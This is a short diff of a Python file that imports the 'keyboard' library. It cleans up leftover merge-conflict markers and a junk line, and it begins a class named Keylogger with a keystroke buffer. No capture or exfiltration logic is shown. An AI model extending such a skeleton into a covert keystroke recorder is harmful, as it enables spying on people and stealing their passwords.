@@ -1,5 +1,5 @@
 from typing import List, Protocol
-import keyboard
+import keyboard   
 
 
 class Listner(Protocol):
@@ -34,9 +34,7 @@ class Listner(Protocol):
         Also, clear the buffer after getting the data.
         """
         ...
-<<<<<<< HEAD
-fvfdgfth
-=======
+
 class Keylogger:
     def __init__(self):
         self.buffer: List[str] = []
